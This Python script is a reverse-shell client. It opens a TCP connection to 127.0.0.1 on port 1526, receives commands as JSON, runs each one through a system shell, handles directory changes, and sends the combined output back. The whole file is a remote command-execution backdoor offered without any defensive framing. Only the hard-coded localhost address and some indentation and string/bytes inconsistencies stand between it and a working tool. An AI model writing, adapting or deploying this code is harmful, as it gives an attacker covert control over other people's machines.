import socket
import subprocess
import json
import os

def send(data):
    json_data = json.dumps(data)
    sock.send(json_data)

def receive():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = receive()
	if command == "":
	    continue
        if command == 'detach':
            continue
	elif command == "quit":
	    sock.close()
	    break
        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue

        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results = proc.stdout.read() + proc.stderr.read()
            send(results)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 1526))

shell()